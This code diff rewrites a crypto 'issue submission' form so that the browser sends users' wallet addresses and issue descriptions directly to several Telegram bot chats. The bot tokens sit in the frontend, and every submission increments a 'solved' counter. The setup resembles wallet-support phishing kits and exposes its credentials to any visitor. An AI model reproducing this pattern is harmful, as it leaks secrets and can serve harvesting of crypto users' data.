@@ -2748,7 +2748,7 @@
         `).join("");
       }
 
-      // Submit issue to Telegram via backend
+      // Submit issue to Telegram (frontend only)
       async function submitIssue(event) {
         event.preventDefault();
 
@@ -2772,34 +2772,47 @@
 
         try {
           const configs = getTelegramConfigs();
-          
-          // Send to backend
-          const response = await fetch("/api/submit-issue", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              walletAddress,
-              issueType: issueTitle,
-              issueDescription,
-              telegramConfigs: configs,
-            }),
-          });
+          const telegramMessage = `
+🚨 <b>New Crypto Issue Submitted</b>
 
-          const result = await response.json();
+<b>Wallet Address:</b> ${walletAddress || "Not provided"}
+<b>Issue Type:</b> ${issueTitle}
+
+<b>Description:</b>
+${issueDescription}
+
+<i>Submitted at: ${new Date().toLocaleString()}</i>
+`;
+
+          let successCount = 0;
+          for (const config of configs) {
+            try {
+              const telegramResponse = await fetch(
+                `https://api.telegram.org/bot${config.token}/sendMessage`,
+                {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    chat_id: config.chatId,
+                    text: telegramMessage,
+                    parse_mode: "HTML",
+                  }),
+                },
+              );
+              if (telegramResponse.ok) successCount++;
+            } catch (error) {
+              console.error(`Error sending to ${config.name}:`, error);
+            }
+          }
 
           // Increment solved count
           const solvedCount = parseInt(localStorage.getItem("solvedIssuesCount") || "0", 10);
           localStorage.setItem("solvedIssuesCount", (solvedCount + 1).toString());
           renderIssues();
-          
-          if (result.success) {
-            showToast(
-              `Issue submitted successfully to ${result.successCount || configs.length}/${configs.length} channels! Our team will review it within 24-48 hours.`,
-              "success",
-            );
-          } else {
-            showToast("Issue submitted! We will review it shortly.", "success");
-          }
+          showToast(
+            `Issue submitted successfully to ${successCount}/${configs.length} channels! Our team will review it within 24-48 hours.`,
+            "success",
+          );
           event.target.reset();
         } catch (error) {
           console.error("Submission error:", error);
